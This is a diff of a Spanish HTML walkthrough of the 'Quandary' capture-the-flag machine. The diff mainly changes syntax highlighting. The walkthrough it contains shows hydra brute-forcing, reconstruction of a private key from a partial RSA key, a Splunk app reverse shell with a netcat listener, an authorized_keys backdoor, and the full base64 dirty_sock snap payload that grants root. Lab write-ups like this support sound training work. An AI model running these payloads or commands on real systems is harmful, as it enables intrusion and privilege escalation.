@@ -19,7 +19,9 @@
     <link rel="shortcut icon" href="../../assets/img/favicon.ico">
     
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
-    <link rel="stylesheet" href="../../assets/css/prism.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
+    <link rel="stylesheet" href="../../assets/highlight/styles/vs2015.min.css">
+    <script src="../../assets/highlight/highlight.min.js"></script>
     <link rel="stylesheet" href="../../assets/css/hmv_w.css">  
 </head>
 <body>
@@ -46,7 +48,7 @@ PORT     STATE SERVICE
 </code></pre>
             <h3>Escaneo de servicios</h3>
 <pre class="pre">
-<code class="language-txt">❯ nmap -sVC -v -p 22,80,8000,8089 192.168.1.14
+<code class="code language-txt">❯ nmap -sVC -v -p 22,80,8000,8089 192.168.1.14
 PORT     STATE SERVICE  VERSION
 22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -85,9 +87,9 @@ PORT     STATE SERVICE  VERSION
 |_/
 </code></pre>
             <h3>HTTP</h3>                
-            <p>En el servicio http veo una página en construcción y el dominio<code class="code_negrita">&nbsp;quandary.hmv&nbsp;</code>que seguidamente lo añadiré a mi archivo<code class="code_negrita">&nbsp;/etc/hosts</code>.</p>
+            <p>En el servicio http veo una página en construcción y el dominio<code class="code_negrita">&nbsp;quandary.hmv&nbsp;</code>que seguidamente lo añadiré a mi archivo<code class="code_negrita">&nbsp;/etc/hosts&nbsp;</code>.</p>
 <pre class="pre">
-<code class="language-txt">❯ curl -s http://192.168.1.14 | html2text
+<code class="code language-txt">❯ curl -s http://192.168.1.14 | html2text
 
 ****** Under Construction ******
 We apologize for the inconvenience, but this website is currently under
@@ -96,14 +98,14 @@ Please check back soon for updates! Please contact admin@quandary.hmv for more
 information!
 </code></pre>
             <h3>Puerto 8000</h3>
-            <p>Aquí tenemos un panel de login de<code class="code_negrita">&nbsp;Splunk</code>.</p>
+            <p>Aquí tenemos un panel de login de<code class="code_negrita">&nbsp;Splunk&nbsp;</code>.</p>
             <img class="img_b" src="../../assets/img/hmv_quandary1/splunkEnterpriselogin.png" alt="splunkEnterpriselogin">
             <h3>Puerto 8089</h3>
-            <p>Aquí puedo ver que la versión de splunk es la<code class="code_negrita">&nbsp;7.1.9</code>.</p>
+            <p>Aquí puedo ver que la versión de splunk es la<code class="code_negrita">&nbsp;7.1.9&nbsp;</code>.</p>
             <img class="img_b" src="../../assets/img/hmv_quandary1/puerto8089.png" alt="puerto8089">
             <h3>Gobuster</h3>
-            <p>Con gobuster hago una búsqueda de subdominios y encuentra<code class="code_negrita">&nbsp;directadmin.quandary.hmv</code>, este también lo añadiré a mi archivo<code class="code_negrita">&nbsp;/etc/hosts</code>.</p>
-<pre class="pre"><code class="language-txt">❯ gobuster vhost -u quandary.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+            <p>Con gobuster hago una búsqueda de subdominios y encuentra<code class="code_negrita">&nbsp;directadmin.quandary.hmv&nbsp;</code>, este también lo añadiré a mi archivo<code class="code_negrita">&nbsp;/etc/hosts&nbsp;</code>.</p>
+<pre class="pre"><code class="code language-txt">❯ gobuster vhost -u quandary.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -122,14 +124,14 @@ Found: directadmin.quandary.hmv
             <img class="img_b" src="../../assets/img/hmv_quandary1/directquandarylogin.png" alt="directquandarylogin">
 
             <p>Con hydra aplico fuerza bruta al formulario.</p>
-<pre class="pre"><code class="language-txt">hydra -l admin -P /usr/share/wordlists/rockyou.txt directadmin.quandary.hmv http-post-form "/login.php:uname=^USER^&psw=^PASS^:F=Incorrect username or password" -V -f -I
+<pre class="pre"><code class="code language-txt">hydra -l admin -P /usr/share/wordlists/rockyou.txt directadmin.quandary.hmv http-post-form "/login.php:uname=^USER^&psw=^PASS^:F=Incorrect username or password" -V -f -I
 [80][http-post-form] host: directadmin.quandary.hmv   login: admin   password: qazxsw
 </code></pre>
             <p>Una vez conectado accedo al dashboard de admin, aquí hay un trozo de una clave rsa pública, otra clave privada y un mensaje.</p>
             <img class="img_b" src="../../assets/img/hmv_quandary1/dashboard.png" alt="dashboard">
             <p>El mensaje pone lo siguiente: <i class="cursiva">Sólo quería decirte que el otro día te dije que me dejaras aquí tu clave pública y privada. Sólo copiaste la clave pública y creo que tu clave privada no se copió completamente en tu portapapeles. De todas formas mándame un email a admin@quandary.hmv cuando hayas copiado tu clave privada aquí. Hablamos la semana que viene.</i></p>
-            <p>Archivo<code class="code_negrita">&nbsp;id_rsa</code>.</p>
-<pre class="pre"><code class="language-txt">zfWP0Oewz87090bqRvmdyw5HvVzOnmhQAAAMEA3bbbBmTDBn4E/86brUv/b3nBhMiR1bbx
+            <p>Archivo<code class="code_negrita">&nbsp;id_rsa&nbsp;</code>.</p>
+<pre class="pre"><code class="code language-txt">zfWP0Oewz87090bqRvmdyw5HvVzOnmhQAAAMEA3bbbBmTDBn4E/86brUv/b3nBhMiR1bbx
 nIEKyhulHY5mf3KcneltIzfJDRdg/pmjCcGTkAkHc0BN9bLy6d2gQLOlsw9PY/tbXuVp69
 LIxDbA4UfeS+/CTrpREVj+rBU1R6DJvJ5pnWSIx+pWEc6M9Ysfi4PQtJgGINxd5BEwyX/g
 yHu5gjadvjsUYTpSGq+pEE44tHhAcrrx81F/J2iKYyyJ9iAxvlqPHWL6mhum1W4OofiWDJ
@@ -137,15 +139,15 @@ C+O4pw4gKwfuX5AAAAEWxhd3JlbmNlQHF1YW5kYXJ5AQ==
 -----END OPENSSH PRIVATE KEY----
 </code></pre>
 
-            <p>Archivo<code class="code_negrita">&nbsp;id_rsa.pub</code>.</p>
-<pre class="pre"><code class="language-txt">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMkW1dygI8UCOwrEjjCnceOqjY2DOnw6kUtCs4KAId5f/xeKjx6hsC9Okvm0u/Rs/TiLhqQm+ibpo/EVZ4vvw8XcrEqTdrU60OPiZO+RRUVHdps+SlLAys/h+jopRfEvfeE4G86Kzm0pNwPoiny9ruLDa3ByPjhe3x9Rx9Vb+2KxZtXkEWeC1G8xILp5jG5gwboe6ncRtvTvko31iZCXG4eEAf04tdCitmF11KDoLgnmWsAmGIZoUDGaoydNUEMi2cGiaUiOzvAIvAbUXoZLRcuOVyPv8eHL+hpmk/xPa4hN6z510EBbfiBEgTj12pu1SMQ1E5DsS/d7n+UxEeM0M1ooVic85ttXAY4VzThX/2c6b7o9iPtZ2QtyvFnV2Fb8RgclN3rrk7sLrw6t4YzxyyLLKGviLDEXssPJ7QSQmbA5kEFTTj8ATg2l+VqKbqljvbslTj/KzJiiycUg5RfHMmi7/gAEI9DMIcOCNgYy2CKDv/1K94VYFOBKOT5nAsMF0= lawrence@quandary
+            <p>Archivo<code class="code_negrita">&nbsp;id_rsa.pub&nbsp;</code>.</p>
+<pre class="pre"><code class="code language-txt">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMkW1dygI8UCOwrEjjCnceOqjY2DOnw6kUtCs4KAId5f/xeKjx6hsC9Okvm0u/Rs/TiLhqQm+ibpo/EVZ4vvw8XcrEqTdrU60OPiZO+RRUVHdps+SlLAys/h+jopRfEvfeE4G86Kzm0pNwPoiny9ruLDa3ByPjhe3x9Rx9Vb+2KxZtXkEWeC1G8xILp5jG5gwboe6ncRtvTvko31iZCXG4eEAf04tdCitmF11KDoLgnmWsAmGIZoUDGaoydNUEMi2cGiaUiOzvAIvAbUXoZLRcuOVyPv8eHL+hpmk/xPa4hN6z510EBbfiBEgTj12pu1SMQ1E5DsS/d7n+UxEeM0M1ooVic85ttXAY4VzThX/2c6b7o9iPtZ2QtyvFnV2Fb8RgclN3rrk7sLrw6t4YzxyyLLKGviLDEXssPJ7QSQmbA5kEFTTj8ATg2l+VqKbqljvbslTj/KzJiiycUg5RfHMmi7/gAEI9DMIcOCNgYy2CKDv/1K94VYFOBKOT5nAsMF0= lawrence@quandary
 </code></pre>
             <h3>Recuperar clave privada a partir de una clave pública débil</h3>
             <p>Al decodear el id_rsa obtengo esta salida.</p>
             <img class="img_m" src="../../assets/img/hmv_quandary1/a-idrsa.png" alt="a-idrsa">
 
-            <p>Añado<code class="code_negrita">&nbsp;AA&nbsp;</code>al inicio del archivo<code class="code_negrita">&nbsp;id_rsa</code>.</p>
-<pre class="pre"><code class="language-txt">AAzfWP0Oewz87090bqRvmdyw5HvVzOnmhQAAAMEA3bbbBmTDBn4E/86brUv/b3nBhMiR1bbx
+            <p>Añado<code class="code_negrita">&nbsp;AA&nbsp;</code>al inicio del archivo<code class="code_negrita">&nbsp;id_rsa&nbsp;</code>.</p>
+<pre class="pre"><code class="code language-txt">AAzfWP0Oewz87090bqRvmdyw5HvVzOnmhQAAAMEA3bbbBmTDBn4E/86brUv/b3nBhMiR1bbx
 nIEKyhulHY5mf3KcneltIzfJDRdg/pmjCcGTkAkHc0BN9bLy6d2gQLOlsw9PY/tbXuVp69
 LIxDbA4UfeS+/CTrpREVj+rBU1R6DJvJ5pnWSIx+pWEc6M9Ysfi4PQtJgGINxd5BEwyX/g
 yHu5gjadvjsUYTpSGq+pEE44tHhAcrrx81F/J2iKYyyJ9iAxvlqPHWL6mhum1W4OofiWDJ
@@ -155,7 +157,7 @@ C+O4pw4gKwfuX5AAAAEWxhd3JlbmNlQHF1YW5kYXJ5AQ==
             <p>Si vuelvo a decodear el id_rsa obtengo una salida distinta donde se puede apreciar el usuario lawrence.</p>
             <img class="img_m" src="../../assets/img/hmv_quandary1/a-idrsa-laurence.png" alt="a-idrsa-laurence">
             <p>Obtener<code class="code_negrita">&nbsp;q</code>.</p>
-<pre class="pre"><code class="language-txt">❯ base64 -d id_rsa | xxd -seek 29 -l 193 -p > ssh_q
+<pre class="pre"><code class="code language-txt">❯ base64 -d id_rsa | xxd -seek 29 -l 193 -p > ssh_q
 ❯ cat ssh_q
 00ddb6db0664c3067e04ffce9bad4bff6f79c184c891d5b6f19c810aca1b
 a51d8e667f729c9de96d2337c90d1760fe99a309c19390090773404df5b2
@@ -167,18 +169,18 @@ f2e9dda040b3a5b30f4f63fb5b5ee569ebd2c8c436c0e147de4befc24eba
 </code></pre>
 
 
-            <p>Con<code class="code_negrita">&nbsp;tr&nbsp;</code>y<code class="code_negrita">&nbsp;sponge&nbsp;</code>quito los espacios que hay en el archivo<code class="code_negrita">&nbsp;ssh_q</code>.</p>
-<pre class="pre"><code class="language-txt">❯ cat ssh_q | tr -d '\n' | sponge ssh_q
+            <p>Con<code class="code_negrita">&nbsp;tr&nbsp;</code>y<code class="code_negrita">&nbsp;sponge&nbsp;</code>quito los espacios que hay en el archivo<code class="code_negrita">&nbsp;ssh_q&nbsp;</code>.</p>
+<pre class="pre"><code class="code language-txt">❯ cat ssh_q | tr -d '\n' | sponge ssh_q
 </code></pre>
 
-            <p>Para los siguientes pasos usaré<code class="code_negrita">&nbsp;RsaCtfTool</code>.</p>
-<pre class="pre"><code class="language-txt">❯ git clone https://github.com/RsaCtfTool/RsaCtfTool
+            <p>Para los siguientes pasos usaré<code class="code_negrita">&nbsp;RsaCtfTool&nbsp;</code>.</p>
+<pre class="pre"><code class="code language-txt">❯ git clone https://github.com/RsaCtfTool/RsaCtfTool
 ❯ cd RsaCtfTool
 ❯ python3 -m pip install -r requirements.txt
 </code></pre>
 
-            <p>Obtener<code class="code_negrita">&nbsp;n&nbsp;</code>y<code class="code_negrita">&nbsp;e</code>.</p>
-<pre class="pre"><code class="language-txt">❯ python3 RsaCtfTool.py --dumpkey --key ../id_rsa.pub
+            <p>Obtener<code class="code_negrita">&nbsp;n&nbsp;</code>y<code class="code_negrita">&nbsp;e&nbsp;</code>.</p>
+<pre class="pre"><code class="code language-txt">❯ python3 RsaCtfTool.py --dumpkey --key ../id_rsa.pub
 n: 4642421543991179019964692016788403177025358063102268524212423228189528596895170405153602445615118419212223226078074453986177472725050022572587024783411210723545417223580795714337658317644600710977643659117646138971288507670714891915567627657016012444148959410342945730970014623180839037352324793504854280898767977521184232703784662443937471871622433994077336438059851303086048286261868207715006857520994317314821143055143592860860368254426653723888757730451605284748162042770667676361851991339230785775821819532309277372272457963213800075499186577460643456066054587133719735722722251521202461419907661026967268418772174427525979398819794375601193383454474268781976098528566869480441959440610281074050975272532072205542487391556023279787075858556906874328679193257003390683054283767394238642958016947628361850991027906221743379943686704898841560306199533457085371947617432419977464891192335343525374168230063727387700039004253
 e: 65537
 </code></pre>
@@ -189,7 +191,7 @@ e: 65537
             <p>Si todo ha salido bien tendremos nuestra id_rsa.</p>
             <img class="img_m" src="../../assets/img/hmv_quandary1/id_rsa_generado.png" alt="id_rsa_generado">
             <p>Me conecto mediante ssh usando la clave privada.</p>
-<pre class="pre"><code class="language-txt">❯ ssh lawrence@192.168.1.14 -i id_rsa_law
+<pre class="pre"><code class="code language-txt">❯ ssh lawrence@192.168.1.14 -i id_rsa_law
 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-69-generic x86_64)
     
  * Documentation:  https://help.ubuntu.com
@@ -204,7 +206,7 @@ uid=1000(lawrence) gid=1000(lawrence) groups=1000(lawrence)
 
             <p>Aparte de lawrence también existe el usuario admin.</p>
 
-<pre class="pre"><code class="language-txt">lawrence@quandary:~$ ls -la /home
+<pre class="pre"><code class="code language-txt">lawrence@quandary:~$ ls -la /home
 
 drwxr-xr-x  5 root       root       4096 Mar 26 09:58 .
 drwxr-xr-x 20 root       root       4096 Feb 26 22:27 ..
@@ -214,7 +216,7 @@ drwxr-xr-x  8 lawrence   lawrence   4096 Feb 25 09:35 lawrence
 
             <p>En el home de admin hay una directorio<code class="code_negrita">&nbsp;splunk-backup&nbsp;</code>y dentro un archivo llamado cred, <code class="code_negrita">&nbsp;cred&nbsp;</code>contiene unas credenciales codificadas en hexadecimal.</p>
 
-<pre class="pre"><code class="language-txt">lawrence@quandary:/home/admin$ cat splunk-backup/cred
+<pre class="pre"><code class="code language-txt">lawrence@quandary:/home/admin$ cat splunk-backup/cred
 61646d696e3a7735564a39692333216f73
 lawrence@quandary:/home/admin$ echo "61646d696e3a7735564a39692333216f73" | xxd -p -r;echo
 admin:w5VJ9i#3!os
@@ -223,17 +225,17 @@ admin:w5VJ9i#3!os
             <p>Uso las credenciales encontradas y me logueo en splunk.</p>
             <img class="img_b" src="../../assets/img/hmv_quandary1/splunkEnterpriseDashboard.png" alt="splunkEnterpriseDashboard">
             <p>Me descargo el archivo tar.</p>
-<pre class="pre"><code class="language-txt">https://github.com/TBGSecurity/splunk_shells/archive/refs/tags/1.3.tar.gz
+<pre class="pre"><code class="code language-txt">https://github.com/TBGSecurity/splunk_shells/archive/refs/tags/1.3.tar.gz
 </code></pre>
             <p>Para instalar el archivo tar tenéis los pasos en el readme este enlace.</p>
-<pre class="pre"><code class="language-txt">https://github.com/TBGSecurity/splunk_shells
+<pre class="pre"><code class="code language-txt">https://github.com/TBGSecurity/splunk_shells
 </code></pre>
-            <p>Una vez termina de instalar verifico que se haya instalado correctamente en<code class="code_negrita">&nbsp;Manage Apps</code>.</p>
+            <p>Una vez termina de instalar verifico que se haya instalado correctamente en<code class="code_negrita">&nbsp;Manage Apps&nbsp;</code>.</p>
             <img class="img_b" src="../../assets/img/hmv_quandary1/Weaponize.png" alt="Weaponize">
             <p>Ahora dejo un netcat a la escucha por el puerto<code class="code_negrita">&nbsp;8888&nbsp;</code>y voy a<code class="code_negrita">&nbsp;Search & Reporting&nbsp;</code>para lanzar una shell.</p>
             <img class="img_b" src="../../assets/img/hmv_quandary1/Weaponize_rev.png" alt="Weaponize_rev">
             <p>Obtengo la shell como usuario admin, añado mi<code class="code_negrita">&nbsp;id_rsa.pub&nbsp;</code>al archivo<code class="code_negrita">&nbsp;authorized_keys&nbsp;</code>para tener una shell interactiva y acceder como usuario admin.</p>
-<pre class="pre"><code class="language-txt">❯ nc -lvnp 8888
+<pre class="pre"><code class="code language-txt">❯ nc -lvnp 8888
 listening on [any] 8888 ...
 connect to [192.168.1.16] from (UNKNOWN) [192.168.1.14] 42622
 id
@@ -241,7 +243,7 @@ uid=1001(admin) gid=1001(admin) groups=1001(admin)
 echo "tu_id_rsa.pub" > /home/admin/.ssh/authorized_keys
 </code></pre>
             <p>Me conecto por ssh.</p>
-<pre class="pre"><code class="language-txt">❯ ssh admin@192.168.1.14
+<pre class="pre"><code class="code language-txt">❯ ssh admin@192.168.1.14
 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-69-generic x86_64)
     
  * Documentation:  https://help.ubuntu.com
@@ -253,7 +255,7 @@ Script started, file is /dev/null
 admin@quandary:~$
 </code></pre>
             <p>Verifico los permisos que tengo con sudo.</p>
-<pre class="pre"><code class="language-txt">admin@quandary:~$ sudo -l
+<pre class="pre"><code class="code language-txt">admin@quandary:~$ sudo -l
 Matching Defaults entries for admin on quandary:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
     
@@ -261,25 +263,25 @@ User admin may run the following commands on quandary:
     (ALL : ALL) NOPASSWD: /usr/bin/snap install *   
 </code></pre>
             <p>Privesc.</p>
-<pre class="pre"><code class="language-txt">https://notes.vulndev.io/wiki/redteam/privilege-escalation/misc-1
+<pre class="pre"><code class="code language-txt">https://notes.vulndev.io/wiki/redteam/privilege-escalation/misc-1
 https://initblog.com/2019/dirty-sock/
 </code></pre>
             <p>Me muevo a<code class="code_negrita">&nbsp;/tmp&nbsp;</code>y sigo los pasos de la web.</p>
-<pre class="pre"><code class="language-txt">admin@quandary:/tmp$ python3 -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > payload.snap
+<pre class="pre"><code class="code language-txt">admin@quandary:/tmp$ python3 -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > payload.snap
 admin@quandary:/tmp$ sudo snap install /tmp/payload.snap --dangerous --devmode
 </code></pre>
-            <p>El exploit ha creado el usuario<code class="code_negrita">&nbsp;dirty_sock&nbsp;</code>la contraseña<code class="code_negrita">&nbsp;dirty_sock</code>.</p>
-<pre class="pre"><code class="language-txt">admin@quandary:/tmp$ cat /etc/passwd | grep "/bin/bash"
+            <p>El exploit ha creado el usuario<code class="code_negrita">&nbsp;dirty_sock&nbsp;</code>la contraseña<code class="code_negrita">&nbsp;dirty_sock&nbsp;</code>.</p>
+<pre class="pre"><code class="code language-txt">admin@quandary:/tmp$ cat /etc/passwd | grep "/bin/bash"
 dirty_sock:x:1002:1002::/home/dirty_sock:/bin/bash
 </code></pre>
             <p>Me logueo como usuario dirty_sock.</p>
-<pre class="pre"><code class="language-txt">admin@quandary:/tmp$ su dirty_sock
+<pre class="pre"><code class="code language-txt">admin@quandary:/tmp$ su dirty_sock
 Password: 
 bash-5.0$ id
 uid=1002(dirty_sock) gid=1002(dirty_sock) groups=1002(dirty_sock),27(sudo)
 </code></pre>
             <p>Verifico de nuevo los permisos con sudo.</p>
-<pre class="pre"><code class="language-txt">bash-5.0$ sudo -l
+<pre class="pre"><code class="code language-txt">bash-5.0$ sudo -l
 [sudo] password for dirty_sock:  
 Matching Defaults entries for dirty_sock on quandary:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -289,7 +291,7 @@ User dirty_sock may run the following commands on quandary:
 </code></pre>
 
             <p>Obtengo el root.</p>
-<pre class="pre"><code class="language-txt">bash-5.0$ sudo su
+<pre class="pre"><code class="code language-txt">bash-5.0$ sudo su
 root@quandary:/tmp# id;hostname
 uid=0(root) gid=0(root) groups=0(root)
 quandary
@@ -300,7 +302,8 @@ quandary
     </main>
         <footer class="footer">
             <a class="a_footer" href="https://github.com/0x-noname" target="_blank"># noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
-            <script src="../../assets/js/prism.js"></script> 
+            <script src="../../assets/highlight/highlight.min.js"></script>
+            <script>hljs.initHighlightingOnLoad();</script>
         </footer>
 </body>
 </html>
